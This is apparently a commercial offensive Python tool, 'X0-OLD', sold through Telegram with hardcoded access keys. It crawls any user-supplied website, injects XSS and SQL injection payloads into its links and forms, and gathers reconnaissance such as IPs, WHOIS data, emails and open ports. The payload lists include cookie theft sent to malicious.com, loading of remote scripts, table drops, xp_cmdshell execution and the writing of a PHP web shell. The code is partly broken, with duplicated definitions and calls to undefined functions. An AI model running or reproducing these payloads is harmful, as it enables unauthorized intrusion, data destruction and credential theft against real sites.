import requests
from bs4 import BeautifulSoup
import socket
import nmap
import subprocess
import concurrent.futures
from colorama import Fore, Style, init
import re
import os
import io
import difflib
import time
import pyfiglet
import random
import sys
import ssl
import dns.resolver
import json
from urllib.parse import quote

# Initialize colorama
init(autoreset=True)


VALID_API_KEYS = [
    "@", "x0F5G6H7I8J", "x0K9L0M1N2O", "x0P3Q4R5S6T", "x0U7V8W9X0Y",
    "x0Z1A2B3C4D", "x0E5F6G7H8I", "x0J9K0L1M2N", "x0O3P4Q5R6S", "x0T7U8V9W0X",
    "x0Y1Z2A3B4C", "x0D5E6F7G8H", "x0I9J0K1L2M", "x0N3O4P5Q6R", "x0S7T8U9V0W",
    "x0X1Y2Z3A4B", "x0C5D6E7F8G", "x0H9I0J1K2L", "x0M3N4O5P6Q", "x0R7S8T9U0V",
    "x0W1X2Y3Z4A", "x0B5C6D7E8F", "x0G9H0I1J2K", "x0L3M4N5O6P", "x0Q7R8S9T0U",
    "x0V1W2X3Y4Z", "x0A5B6C7D8E", "x0F9G0H1I2J", "x0K3L4M5N6O", "x0P7Q8R9S0T",
    "x0U1V2W3X4Y", "x0Z5A6B7C8D", "x0E9F0G1H2I", "x0J3K4L5M6N", "x0O7P8Q9R0S",
    "x0T1U2V3W4X", "x0Y5Z6A7B8C", "x0D9E0F1G2H", "x0I3J4K5L6M", "x0N7O8P9Q0R",
    "x0S1T2U3V4W", "x0X5Y6Z7A8B", "x0C9D0E1F2G", "x0H3I4J5K6L", "x0M7N8O9P0Q",
    "x0R1S2T3U4V", "x0W5X6Y7Z8A", "x0B9C0D1E2F", "x0G3H4I5J6K", "x0L7M8N9O0P"
]

os.system('clear')


def slow_print(text, color, delay=0.05):
    """Print text slowly with color control."""
    for char in text:
        print(color + char, end='', flush=True)
        time.sleep(delay)
    print(Style.RESET_ALL)  # Reset after printing

def check_api_key():
    # Initial message in white with slow print
    slow_print("Please enter your tool access key. If you don't have one, purchase it ..", Fore.WHITE, delay=0.02)
    print("")
    
    # Second message in blue without slow print
    print(Fore.CYAN + "To purchase access keys, contact us via this Telegram bot:" + Style.RESET_ALL)
    
    # Telegram username in red with slow print
    slow_print("https://t.me/AnonDos777Bot", Fore.RED, delay=0.05)
    
    print("")
    
    while True:
        # Request for input key in green with fast slow print
        slow_print("Please enter your API key 🔑 : ", Fore.GREEN, delay=0.02)
        
        # User input in red
        user_input = input(Fore.MAGENTA).strip()  # Use .strip() to remove leading/trailing spaces
        
        # Reset styles after user input
        print(Style.RESET_ALL)

        # If the user input is empty (just Enter), ask again
        if not user_input:
            print(Fore.RED + "Error: You must enter a valid key. Please try again." + Style.RESET_ALL)
            continue  # Loop again to ask for input

        # Check if the entered key is in the valid list
        if user_input in VALID_API_KEYS:
            print(Fore.GREEN + "Welcome!" + Fore.RESET)
            print(Fore.WHITE + "Press Enter to proceed ▶️" + Fore.RESET)
            input()  # Wait for user to press Enter
            return True  # Allow access to the tool
        else:
            # Print random fake error codes to stop the program
            print(Fore.RED + "Invalid access key, please enter a correct key to enter ❌" + Style.RESET_ALL)
            generate_fake_errors()
            return False

def generate_fake_errors():
    # Generate random fake error codes
    for i in range(10):
        print(f"Error {i+1}: {random.randint(1000, 9999)} - Fatal system error.")
    sys.exit()  # Exit the program after printing fake codes

# Run the old tool function
def run_old_tool():
    print("Running the old tool...")
    # Place old tool code here

def main():
    # Check the entered key
    if check_api_key():
        # If the key is valid, run the tool
        run_old_tool()

if __name__ == "__main__":
    main()

# Create a session object
session = requests.Session()

# Set up session to manage redirects and User-Agent
session.headers.update({
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'
})

# Function to print colored text
def print_colored(text, color):
    print(color + text + Style.RESET_ALL)
    
# Input function that validates user input
def enter_num():
    while True:  # Infinite loop until a valid number is entered
        choice = input(Fore.YELLOW + "Choose one of these options by entering its number: " + Style.RESET_ALL + "\n")

        if choice == '1':
            vuln_menu()  # Add function here for your vulnerability scan options
        elif choice == '2':
            gather_info_menu()  # Add function here for your information gathering options
        elif choice == '3':
            nmap_scan()
        elif choice == '4':
            path_discovery()
        elif choice == '5':
            print_colored("Goodby,Best regards MR 𝗢𝗹𝗱 ..",Fore.MAGENTA)
            sys.exit()
            break  # Exit the loop after valid input
        else:
            print_colored("Invalid choice! Please enter a valid number.", Fore.RED)


# Function to show logo with slow print
def show_logo():
    # Clear screen
    os.system('cls' if os.name == 'nt' else 'clear')  
    
    # Define variables inside the function
    logo_text = "X0-OLD"
    subtitle = "Anonymous Arabs Organization"
    urlans = "Telegram : "
    urlas = "https://t.me/Anonymusarabs"

    # Version and modification info
    release_text = "Release : "
    version_text = "1.0 - 2024/11"

    # Generate large logo using pyfiglet with a bigger font
    big_logo = pyfiglet.figlet_format(logo_text, font="banner3-D")

    # Display the big logo with slow print
    for line in big_logo.splitlines():
        print(Fore.RED + Style.BRIGHT + line, flush=True)
        time.sleep(0.08)  # Delay between lines for effect

    print()  # New line after logo

    # Display the subtitle with delay
    for char in subtitle:
        print(Fore.CYAN + Style.BRIGHT + char, end='', flush=True)
        time.sleep(0.02)
    
    print("\n")  # New line after subtitle

    # Display Telegram link with delay
    for char in urlans:
        print(Fore.CYAN + Style.BRIGHT + char, end='', flush=True)
        time.sleep(0.004)

    for char in urlas:
        print(Fore.RED + Style.BRIGHT + char, end='', flush=True)
        time.sleep(0.004)

    print("\n")  # New line after link

    # Display Release info with color coding (cyan for 'Release' and red for version)
    for char in release_text:
        print(Fore.CYAN + Style.BRIGHT + char, end='', flush=True)
        time.sleep(0.004)
    
    for char in version_text:
        print(Fore.RED + Style.BRIGHT + char, end='', flush=True)
        time.sleep(0.02)

    print("\n")  

    time.sleep(0.4)

# Main menu function
def main_menu():
    show_logo()
    print_colored("========================================", Fore.CYAN)
    print_colored("           Web Vulnerability Detector          ", Fore.GREEN)
    print_colored("========================================", Fore.CYAN)
    print()
    print_colored("1. Vulnerability Scan", Fore.MAGENTA)
    print_colored("2. Information Gathering", Fore.MAGENTA)
    print_colored("3. Nmap Deep Vulnerability Scan", Fore.MAGENTA)
    print_colored("4. Path Discovery & Admin Page Brute Force", Fore.MAGENTA)
    print_colored("5. Exit", Fore.RED)
    print_colored("========================================", Fore.RED)
    print()
    enter_num()

# List of known sites for comparison
known_sites = [
    "www.google.com", "www.facebook.com", "www.youtube.com", 
    "www.amazon.com", "www.wikipedia.org", "www.example.com"
]

# Function to validate URL
def validate_url(url):
    pattern = r'^(www\.)?([a-zA-Z0-9_-]+\.)+[a-zA-Z]{2,6}$'
    return re.match(pattern, url) is not None

# Function to suggest similar URLs based on available links using difflib
def suggest_url(url):
    suggestions = difflib.get_close_matches(url, known_sites, n=3, cutoff=0.6)  # Similarity threshold of 60%
    return suggestions if suggestions else None

# Function to check if the site is operational
def check_site_status(url):
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            return True
        else:
            print_colored(f"The site is unavailable. HTTP Status: {response.status_code}", Fore.RED)
            return False
    except requests.RequestException:
        print_colored("The site is unavailable or there is a connection error.", Fore.RED)
        return False

# Validate the entered protocol
def validate_protocol(protocol_choice):
    if protocol_choice not in ['1', '2']:
        print_colored("Please choose a valid protocol (1 for HTTP or 2 for HTTPS)", Fore.RED)
        return False
    return True

# List of vulnerabilities to scan with associated checking functions
def vuln_menu():
    print_colored("\nVulnerability Scan", Fore.CYAN)

    # Validate site input without protocol
    while True:
        url = input(Fore.YELLOW + "Enter the site link without the protocol (e.g., www.example.com): " + Style.RESET_ALL + "\n")
        
        if validate_url(url):
            break
        else:
            suggested_urls = suggest_url(url)
            if suggested_urls:
                print_colored("The link is invalid. Did you mean one of the following links?", Fore.YELLOW)
                for suggested in suggested_urls:
                    print_colored(f"- {suggested}", Fore.GREEN)
                url = suggested_urls[0]  # Choose the first suggestion as default
                break
            else:
                print_colored("Invalid link and no suggestions available. Please enter a valid link.", Fore.RED)

    # Validate the entered protocol
    while True:
        print_colored("1. HTTP", Fore.GREEN)
        print_colored("2. HTTPS", Fore.GREEN)
        protocol_choice = input(Fore.YELLOW + "Choose the protocol: " + Style.RESET_ALL + "\n")
        if validate_protocol(protocol_choice):
            break

    protocol = 'https://' if protocol_choice == '2' else 'http://'
    target_url = protocol + url

    # Check if the site is operational
    while True:
        if check_site_status(target_url):
            break
        else:
            url = input(Fore.YELLOW + "Enter an operational site link without the protocol (e.g., www.example.com): " + Style.RESET_ALL + "\n")
            if validate_url(url):
                target_url = protocol + url

    print_colored("\nSelect the type of examination ( 1 , 2 , 3 , 4 ) :", Fore.CYAN)
    print_colored("1. XSS Check", Fore.GREEN)
    print_colored("2. SQL Injection Check", Fore.GREEN)
    print_colored("3. CSRF Check", Fore.GREEN)
    print_colored("4. Comprehensive scan for all vulnerabilities", Fore.GREEN)
    print_colored("5. Return to previous list", Fore.MAGENTA)
    
    vuln_choice = input(Fore.YELLOW + "Choose the type of examination :" + Style.RESET_ALL + "\n")
    
    if vuln_choice == '1':
        print_colored("\n XSS checking...", Fore.CYAN)
        xss_payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg/onload=alert(1)>',
            '<iframe src="javascript:alert(1)"></iframe>',
            '<body onload=alert(1)>',
            '<script>document.body.appendChild(document.createElement(\'script\')).src=\'http://malicious.com/mal.js\'</script>',
            '<script>fetch(\'http://malicious.com/?cookie=\' + document.cookie)</script>',
            '<script>window.location=\'http://malicious.com/?cookie=\' + document.cookie</script>',
            '<script>console.log(\'XSS\')</script>',
            '<script>eval(\'alert(1)\')</script>',
            '<script>new Image().src=\'http://malicious.com/?cookie=\' + document.cookie</script>',
            '<a href="#" onclick="alert(1)">Click me</a>',
            '<button onclick="alert(1)">Click me</button>',
            '<div onmouseover="alert(1)">Hover over me</div>',
            '<input type="text" value="test" onfocus="alert(1)">',
            '<script>document.write(\'<img src=x onerror=alert(1)>\')</script>',
            '<style>@import\'http://malicious.com/mal.css\';</style>',
            '<script>setTimeout(function() { alert(1); }, 1000);</script>',
            '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
            '<script src="http://malicious.com/mal.js"></script>',
            '{"data": "<script>alert(1)</script>"}',
            '{"value": "<img src=x onerror=alert(1)>"}',
            '<script>document.write(atob(\'YWxlcnQoMSk=\'))</script>',
            '<script>var encoded = \'YWxlcnQoMSk=\'; eval(atob(encoded));</script>',
            '<script src="data:text/javascript;base64,YWxlcnQoMSk="></script>',
            '<svg><script>alert(1)</script></svg>',
            '<script>var x = document.createElement("script"); x.src = "http://malicious.com/mal.js"; document.body.appendChild(x);</script>',
            '<meta http-equiv="refresh" content="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTw8L3NjcmlwdD4=">'
        ]
        crawl_and_test(target_url, xss_payloads, "XSS")

    elif vuln_choice == '2':
        print_colored("\n SQL Injection Check...", Fore.CYAN)
        sql_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' -- ",
            "' OR '1'='1' /*",
            "' UNION SELECT NULL, NULL -- ",
            "' UNION SELECT 1, 'test' -- ",
            "' UNION SELECT username, password FROM users -- ",
            "' UNION ALL SELECT NULL,NULL -- ",
            "' AND 1=2 UNION SELECT NULL, username, password FROM users -- ",
            "'; DROP TABLE users; --",
            "'; --",
            "' OR 1=1; --",
            "' AND 1=0 UNION SELECT NULL, @@version --",
            "' AND SUBSTRING(password, 1, 1) = 'a' --",
            "'; EXEC master..xp_cmdshell('net user'); --",
            "' UNION SELECT NULL, password FROM users WHERE username='admin' -- ",
            "' UNION SELECT 1,2,3 INTO OUTFILE '/var/www/html/shell.php' --",
            "' AND ASCII(LEFT((SELECT user_login FROM users LIMIT 1),1)) > 0 --",
            "' AND LENGTH(password) = 5; --",
            "' OR (SELECT 1 FROM users WHERE username = 'admin' AND password = 'password') --",
            "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0; --",
            "' OR (SELECT IF(1=1, SLEEP(5), 0)); --",
            "'; EXECUTE IMMEDIATE 'SELECT * FROM users'; --",
            "'; EXECUTE IMMEDIATE 'SELECT password FROM users WHERE username = ''admin'''; --"
        ]
        crawl_and_test(target_url, sql_payloads, "SQL Injection")

    elif vuln_choice == '3':
        print_colored("\n CSRF check...", Fore.CYAN)
        crawl_and_test_csrf(target_url)

    elif vuln_choice == '4':
        print_colored("\n Comprehensive scan for all vulnerabilities...", Fore.CYAN)
        xss_payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg/onload=alert(1)>',
            '<iframe src="javascript:alert(1)"></iframe>',
            '<body onload=alert(1)>',
            '<script>document.body.appendChild(document.createElement(\'script\')).src=\'http://malicious.com/mal.js\'</script>',
            '<script>fetch(\'http://malicious.com/?cookie=\' + document.cookie)</script>',
            '<script>window.location=\'http://malicious.com/?cookie=\' + document.cookie</script>',
            '<script>console.log(\'XSS\')</script>',
            '<script>eval(\'alert(1)\')</script>',
            '<script>new Image().src=\'http://malicious.com/?cookie=\' + document.cookie</script>',
            '<a href="#" onclick="alert(1)">Click me</a>',
            '<button onclick="alert(1)">Click me</button>',
            '<div onmouseover="alert(1)">Hover over me</div>',
            '<input type="text" value="test" onfocus="alert(1)">',
            '<script>document.write(\'<img src=x onerror=alert(1)>\')</script>',
            '<style>@import\'http://malicious.com/mal.css\';</style>',
            '<script>setTimeout(function() { alert(1); }, 1000);</script>',
            '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
            '<script src="http://malicious.com/mal.js"></script>',
            '{"data": "<script>alert(1)</script>"}',
            '{"value": "<img src=x onerror=alert(1)>"}',
            '<script>document.write(atob(\'YWxlcnQoMSk=\'))</script>',
            '<script>var encoded = \'YWxlcnQoMSk=\'; eval(atob(encoded));</script>',
            '<script src="data:text/javascript;base64,YWxlcnQoMSk="></script>',
            '<svg><script>alert(1)</script></svg>',
            '<script>var x = document.createElement("script"); x.src = "http://malicious.com/mal.js"; document.body.appendChild(x);</script>',
            '<meta http-equiv="refresh" content="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTw8L3NjcmlwdD4=">'
        ]
        sql_payloads = [
            "' OR '1'='1",
            "' OR '1'='1' -- ",
            "' OR '1'='1' /*",
            "' UNION SELECT NULL, NULL -- ",
            "' UNION SELECT 1, 'test' -- ",
            "' UNION SELECT username, password FROM users -- ",
            "' UNION ALL SELECT NULL,NULL -- ",
            "' AND 1=2 UNION SELECT NULL, username, password FROM users -- ",
            "'; DROP TABLE users; --",
            "'; --",
            "' OR 1=1; --",
            "' AND 1=0 UNION SELECT NULL, @@version --",
            "' AND SUBSTRING(password, 1, 1) = 'a' --",
            "'; EXEC master..xp_cmdshell('net user'); --",
            "' UNION SELECT NULL, password FROM users WHERE username='admin' -- ",
            "' UNION SELECT 1,2,3 INTO OUTFILE '/var/www/html/shell.php' --",
            "' AND ASCII(LEFT((SELECT user_login FROM users LIMIT 1),1)) > 0 --",
            "' AND LENGTH(password) = 5; --",
            "' OR (SELECT 1 FROM users WHERE username = 'admin' AND password = 'password') --",
            "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0; --",
            "' OR (SELECT IF(1=1, SLEEP(5), 0)); --",
            "'; EXECUTE IMMEDIATE 'SELECT * FROM users'; --",
            "'; EXECUTE IMMEDIATE 'SELECT password FROM users WHERE username = ''admin'''; --"
        ]
        
        crawl_and_test(target_url, xss_payloads, "XSS")
        crawl_and_test(target_url, sql_payloads, "SQL Injection")
        crawl_and_test_csrf(target_url)

    elif vuln_choice == '5':
        main_menu()  # Back to main menu
    else:
        print_colored("Incorrect choice!", Fore.RED)
        vuln_menu()

    post_scan_options()

def post_scan_options():
    slow_print("\n Do you want to :", Fore.CYAN, delay=0.05)
    print_colored("1. Return to the checklist",Fore.MAGENTA)
    print_colored("2. Terminate the program",Fore.MAGENTA)
    
    while True:
        choice = input(Fore.YELLOW + "Choose an option: ")
        if choice == '1':
            main_menu()
            break
        elif choice == '2':
            print_colored("Best regards MR 𝗢𝗹𝗱 ..", Fore.RED)
            sys.exit()
        else:
            slow_print("Incorrect choice 🚫 Please choose a valid option.", Fore.RED, delay=0.01)



# الزحف واختبار الثغرات
def crawl_and_test(url, payloads, vuln_type):
    print_colored(f"Crawl on the site:{url}", Fore.CYAN)
    crawled_urls, forms = crawl_site(url)

    # فحص الروابط والفورمز بشكل كامل واستخدام جميع البايلودات
    print_colored(f"\n Check the link for vulnerabilities. {vuln_type}...", Fore.CYAN)
    test_vulnerabilities(url, crawled_urls, forms, payloads, vuln_type)

# الزحف وجمع الروابط والفورمز من الموقع
def crawl_site(url):
    crawled_urls = set()
    forms = []

    try:
        response = session.get(url, timeout=10)
        response.raise_for_status()
        soup = BeautifulSoup(response.text, 'html.parser')

        for link in soup.find_all('a', href=True):
            full_url = requests.compat.urljoin(url, link['href'])
            if url in full_url and full_url not in crawled_urls:
                crawled_urls.add(full_url)
                time.sleep(1)  # إضافة تأخير بين كل طلب

        forms = soup.find_all('form')
    except requests.exceptions.RequestException as e:
        print_colored(f"A mistake while crawling:🚫 : {e}", Fore.RED)
    
    return crawled_urls, forms
    
    # إنشاء كائن session
session = requests.Session()


# فحص الثغرات وتحديث التقرير
# محاولة فحص الرابط مع إعادة المحاولة في حالة حدوث خطأ
def test_vulnerabilities(base_url, urls, forms, payloads, vuln_type):
    report = []
    
    # فحص الروابط
    for url in urls:
        params = get_params(url)
        for param in params:
            for payload in payloads:
                new_url = f"{url}?{param}={payload}"
                attempt = 0
                while attempt < 3:  # إعادة المحاولة حتى 3 مرات
                    try:
                        response = session.get(new_url, timeout=10)
                        if payload in response.text:
                            report.append({
                                "vuln_type": vuln_type,
                                "param": param,
                                "url": url,
                                "payload": payload,
                                "direct_link": new_url
                            })
                            print_colored(f"✅ Exploit found {vuln_type} Discovered in this parameter : {param} In this link : {url}", Fore.GREEN)
                            break  # الانتقال إلى الباراميتر أو الفورم التالي بعد اكتشاف الثغرة
                        break
                    except requests.exceptions.RequestException as e:
                        attempt += 1
                        print_colored(f"خطأ أثناء فحص الرابط {url}: {e}, إعادة المحاولة ({attempt}/3)", Fore.RED)
                        time.sleep(1)  # انتظار قبل إعادة المحاولة

    # فحص الفورمات
    for form in forms:
        action = form.get('action')
        method = form.get('method', 'get').lower()
        inputs = form.find_all('input')
        action_url = requests.compat.urljoin(base_url, action) if action else base_url
        
        try:
            for payload in payloads:
                form_data = {input_tag.get('name'): payload for input_tag in inputs if input_tag.get('name')}
                if method == 'post':
                    response = session.post(action_url, data=form_data, timeout=10)
                else:
                    response = session.get(action_url, params=form_data, timeout=10)

                if payload in response.text:
                    report.append({
                        "vuln_type": vuln_type,
                        "form_action": action_url,
                        "payload": payload
                    })
                    print_colored(f"✅ Exploit  {vuln_type} In the form that started {action_url}", Fore.RED)
                    break  # الانتقال إلى الفورم التالي بعد اكتشاف الثغرة

        except requests.exceptions.RequestException as e:
            print_colored(f"🔴 Error checking form in link {action_url} : {e}", Fore.RED)

    generate_report(report)




# توليد تقرير مفصل عن الفحص
def generate_report(report):
    if report:
        report_text = ""  # لاحتواء نص التقرير المفصل

        # بداية التقرير
        report_text += "========================================\n"
        report_text += "By X0 Tool ..\n"
        report_text += "========================================\n"
        
        for item in report:
            vuln_type = item.get('vuln_type', 'ثغرة غير محددة')
            payload = item.get('payload', 'لا يوجد بايلود')
            
            # تشفير البايلود
            encoded_payload = quote(payload)
            
            if 'param' in item:
                param = item['param']
                url = item['url']
                
                # التأكد من إضافة الباراميتر مع البايلود
                direct_link = f"{url}?{param}={encoded_payload}"

                # إضافة التفاصيل إلى نص التقرير
                report_text += f"ثغرة {vuln_type} مكتشفة في الباراميتر '{param}' في الرابط {url}\n"
                report_text += f"البايلود المستخدم: {payload}\n"
                report_text += f"رابط مباشر: {direct_link}\n"
                report_text += "\n=======================\n"
            
            if 'form_action' in item:
                # دمج البايلود مع رابط الفورم لتكوين رابط مباشر
                direct_link = f"{item['form_action']}?{encoded_payload}"
                
                # إضافة التفاصيل إلى نص التقرير
                report_text += f"ثغرة {vuln_type} مكتشفة في الفورم في الرابط {item['form_action']}\n"
                report_text += f"البايلود المستخدم: {payload}\n"
                report_text += f"رابط مباشر: {direct_link}\n"
                report_text += "\n=======================\n"
        
        
        # نهاية التقرير
        report_text += "========================================\n"
        report_text += "By X0 Tool ..\n"
        report_text += "========================================\n"
  

        # سؤال المستخدم إذا كان يريد حفظ التقرير
        print("")
        
        save_choice = input(Fore.YELLOW + "Do you want to save the report to a text file? (y/n) :").strip().lower()
        
        print("")
        
        if save_choice in ['y', 'yes']:
            save_report_to_file(report_text)
        elif save_choice in ['n', 'no']:
            print_colored("Best regards MR 𝗢𝗹𝗱 ..",Fore.MAGENTA)
        else:
            print_colored("🚫 Invalid selection. Best regards MR 𝗢𝗹𝗱 ..",Fore.RED)
    else:
        print_colored("🔴 No vulnerabilities were found , No Exploit ❌.", Fore.RED)

# دالة لحفظ التقرير في ملف
def save_report_to_file(report):
    while True:
        print("")
        file_name = input(Fore.YELLOW + "Type the file name with the extension ( .txt ) :" + Style.RESET_ALL + "\n").strip()
        if file_name.endswith(".txt"):
            print("")
            file_path = file_name
            break
        else:
            print_colored("Please make sure to add the .txt extension to the file name.", Fore.RED)

    with open(file_path, "w", encoding='utf-8') as file:
        file.write(report)
    print_colored(f"✅ The report has been saved to the file : {os.path.abspath(file_path)}",Fore.GREEN)

# دالة لطباعة النص بلون محدد (مطلوبة للوظائف)
def print_colored(text, color):
    print(color + text + Fore.RESET)


# الزحف واختبار الثغرات (محدث)
def crawl_and_test(url, payloads, vuln_type):
    print_colored(f"Crawl on the site:{url}", Fore.CYAN)
    crawled_urls, forms = crawl_site(url)

    # فحص الروابط والفورمز بشكل كامل واستخدام جميع البايلودات
    print_colored(f"\n Check the link for vulnerabilities. {vuln_type}...", Fore.CYAN)
    test_vulnerabilities(url, crawled_urls, forms, payloads, vuln_type)

    # إضافة سطر يفصل بين الفحوصات
    slow_print("========================================", Fore.YELLOW, delay=0.04)

# الزحف واختبار CSRF (مطور)
def crawl_and_test_csrf(url):
    print(f" {url}")
    response = requests.get(url)
    soup = BeautifulSoup(response.text, 'html.parser')
    
    forms = soup.find_all('form')
    csrf_vulns = []

    for form in forms:
        action = form.get('action')
        form_url = url + action if action else url
        inputs = form.find_all('input')

        has_csrf_token = False

        # التحقق من وجود حقل CSRF في الفورم
        for input_tag in inputs:
            input_name = input_tag.get('name')
            if input_name and ('csrf' in input_name.lower() or 'token' in input_name.lower()):
                has_csrf_token = True

        # التحقق من وجود meta tag للـ CSRF
        csrf_meta = soup.find('meta', {'name': 'csrf-token'})
        if csrf_meta:
            has_csrf_token = True

        # التحقق من هيدر SameSite
        cookies = response.headers.get('Set-Cookie', '')
        if 'SameSite' not in cookies:
            print_colored(f"🔴 Warning : The site is not using SameSite to protect against CSRF vulnerability", Fore.YELLOW)

        # التحقق من هيدر Referer
        if 'Referer' not in response.headers:
            print_colored(f"🔴 Warning : The site does not check the referrer header for CSRF protection", Fore.YELLOW)

        # إذا لم يتم العثور على رمز CSRF
        if not has_csrf_token:
            csrf_vulns.append(form_url)

    if csrf_vulns:
        print_colored("⚠️ The site may be vulnerable to CSRF", Fore.RED)
        for vuln in csrf_vulns:
            print(f"📍The site may have a CSRF vulnerability in this link: {vuln}")
    else:
        print_colored("🔰The site is not infected with CSRF vulnerability", Fore.GREEN)

# استخراج البارامترات من الروابط
def get_params(url):
    if '?' not in url:
        return []
    params = url.split('?')[1]
    return [param.split('=')[0] for param in params.split('&')]

# دالة لطباعة النص بألوان
def print_colored(text, color):
    print(color + text + Style.RESET_ALL)

# التحقق من أن الموقع يعمل
def check_site_status(url):
    try:
        response = requests.get(url, timeout=5)
        if response.status_code == 200:
            return True
        else:
            print_colored(f"The site is unavailable. HTTP Status: {response.status_code}", Fore.RED)
            return False
    except requests.RequestException:
        print_colored("The site is unavailable or there is a connection error.", Fore.RED)
        return False

# التحقق من صحة اختيار البروتوكول
def validate_protocol(protocol_choice):
    if protocol_choice not in ['1', '2']:
        print_colored("Please choose a valid protocol (1 for HTTP or 2 for HTTPS)", Fore.RED)
        return False
    return True

# قائمة جمع المعلومات
def gather_info_menu():
    print_colored("\nCollect information about site", Fore.CYAN)
    
    
    report_lines = []

    # التحقق من صحة الرابط المدخل
    while True:
        url = input(Fore.YELLOW + "Enter the site link without the protocol (e.g., example.com): " + Style.RESET_ALL + "\n")
        
        # تحقق مما إذا كان الرابط يحتوي على بروتوكول
        if url.startswith("http://") or url.startswith("https://"):
            print_colored("Please enter the site link without the protocol.", Fore.RED)
        elif validate_url(url):
            break
        else:
            print_colored("Invalid link. Please enter a valid link.", Fore.RED)

    # التحقق من صحة البروتوكول المدخل
    while True:
        print_colored("1. HTTP", Fore.GREEN)
        print_colored("2. HTTPS", Fore.GREEN)
        protocol_choice = input(Fore.YELLOW + "Choose the protocol: " + Style.RESET_ALL + "\n")
        if validate_protocol(protocol_choice):
            break

    protocol = 'https://' if protocol_choice == '2' else 'http://'
    target_url = protocol + url

    # التحقق من أن الموقع يعمل
    while True:
        if check_site_status(target_url):
            break
        else:
            url = input(Fore.YELLOW + "Enter an operational site link without the protocol (e.g., example.com): " + Style.RESET_ALL + "\n")
            if validate_url(url):
                target_url = protocol + url

    # الحصول على IP الحقيقي للموقع
    real_ips = get_real_ip(url)
    if real_ips:
        print_colored(f"Real IP(s) for {url}: {', '.join(real_ips)}", Fore.GREEN)

    # تنفيذ جمع المعلومات على الرابط المدخل
    gather_info(target_url)

# التحقق من صحة الرابط المدخل
def validate_url(url):
    # التحقق من وجود نقطة في الرابط، مما يعني تنسيق مقبول
    return "." in url

# الحصول على IP الحقيقي للموقع
def get_real_ip(domain):
    try:
        # الحصول على سجلات A للمجال
        answers = dns.resolver.resolve(domain, 'A')
        return [str(answer) for answer in answers]
    except Exception as e:
        print_colored(f"Failed to resolve IP: {e}", Fore.GREEN)
        return None

# دالة لجمع المعلومات عن الموقع
def gather_info(url):
    report = []  # متغير لتخزين التقرير النهائي

    domain = url.replace('http://', '').replace('https://', '')
    ip = socket.gethostbyname(domain)
    
    report.append(f"Collect information about this site: {url}")
    print_colored("========================================", Fore.RED)
    
    print_colored(f"\nCollect information about this site: ", Fore.MAGENTA)
    print_colored(f"{url}", Fore.GREEN)
    print_colored("========================================", Fore.RED)
    report.append("========================================")
    report.append(f"IP : {ip}")
    report.append("========================================")
    print_colored("IP :", Fore.MAGENTA)
    print_colored(f"{ip}", Fore.GREEN)
    print_colored("========================================", Fore.CYAN)

    ssl_info = check_ssl(domain)
    report.append(f"SSL Certificate Expiry: {ssl_info}")
    report.append("========================================")
    print_colored(f"SSL Certificate Expiry : ", Fore.MAGENTA)
    print_colored(f" {ssl_info}", Fore.GREEN)
    print_colored("========================================", Fore.CYAN)

    wsheaders = requests.get(url).headers
    ws = wsheaders.get('Server', 'Could Not Detect')
    report.append(f"Web Server: {ws}")
    report.append("========================================")
    print_colored(f"Web Server : ", Fore.MAGENTA)
    print_colored(f" {ws}", Fore.GREEN)
    print_colored("========================================", Fore.CYAN)

    tcms = detect_cms(requests.get(url).text, url)
    report.append(f"CMS : {tcms}")
    report.append("========================================")
    print_colored("CMS :", Fore.MAGENTA)
    print_colored(f"{tcms}", Fore.GREEN)
    print_colored("========================================", Fore.CYAN)

    cloudflare_status = check_cloudflare(domain)
    report.append(f"Cloudflare: {cloudflare_status}")
    report.append("========================================")
    print_colored(f"Cloudflare : ", Fore.MAGENTA)
    print_colored(f" {cloudflare_status}", Fore.GREEN)
    print_colored("========================================", Fore.CYAN)

    robots_content = check_robots(url)
    report.append(f"Robots File:\n{robots_content}")
    report.append("========================================")
    print_colored("Robots File:", Fore.GREEN)
    print_colored(robots_content, Fore.LIGHTYELLOW_EX)
    print_colored("========================================", Fore.CYAN)

    whois_data = check_whois(domain)
    report.append(f"WHOIS Lookup:\n{whois_data}")
    report.append("========================================")
    print_colored(f"WHOIS Lookup :", Fore.MAGENTA)
    print_colored(f"{whois_data}", Fore.GREEN)
    print_colored("========================================", Fore.CYAN)

    geoip_data = check_geoip(domain)
    report.append(f"GEO IP Lookup:\n{geoip_data}")
    report.append("========================================")
    print_colored(f"GEO IP Lookup :", Fore.MAGENTA)
    print_colored(f"{geoip_data}", Fore.GREEN)
    print_colored("========================================", Fore.CYAN)

    dns_data = check_dns(domain)
    report.append(f"DNS Lookup:\n{dns_data}")
    report.append("========================================")
    print_colored(f"DNS Lookup :", Fore.MAGENTA)
    print_colored(f"{dns_data}", Fore.GREEN)
    print_colored("========================================", Fore.CYAN)

    subnet_data = check_subnet(domain)
    report.append(f"Subnet Calculation:\n{subnet_data}")
    report.append("========================================")
    print_colored(f"Subnet Calculation :", Fore.MAGENTA)
    print_colored(f"{subnet_data}", Fore.GREEN)
    print_colored("========================================", Fore.CYAN)

    js_files = analyze_js(url)
    report.append(f"JavaScript files:\n{js_files}")
    report.append("========================================")
    print_colored(f"JavaScript files :", Fore.MAGENTA)
    print_colored(f"{js_files}", Fore.GREEN)
    print_colored("========================================", Fore.CYAN)

    security_headers = check_security_headers(wsheaders)
    report.append("Security Headers:\n" + security_headers)
    report.append("========================================")
    print_colored("Security Headers:\n" + security_headers, Fore.CYAN)
    print_colored("========================================", Fore.CYAN)

    emails_phones = extract_emails_and_phones(url)
    report.append(emails_phones)
    report.append("========================================")
    print_colored(emails_phones, Fore.CYAN)
    print_colored("========================================", Fore.CYAN)

    port_scan_result = start_port_check(ip)
    report.append(port_scan_result)
    report.append("========================================")
    print_colored(port_scan_result, Fore.GREEN)
    print_colored("========================================", Fore.CYAN)

    user_save_report("\n".join(report))  # استدعاء الدالة الجديدة لحفظ التقرير


